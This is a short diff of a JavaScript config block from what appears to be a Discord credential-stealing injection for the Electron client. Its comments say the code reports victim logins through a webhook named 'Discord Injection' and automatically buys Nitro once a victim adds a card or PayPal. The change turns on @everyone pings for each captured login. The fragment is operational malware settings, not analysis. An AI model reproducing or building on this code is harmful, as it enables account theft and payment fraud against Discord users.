@@ -6,7 +6,7 @@ const { BrowserWindow, session } = require('electron')
 
 const config = {
     auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-    ping_on_run: false, //pings @everyone when you get a run/login
+    ping_on_run: true, //pings @everyone when you get a run/login
     ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
     embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
     embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
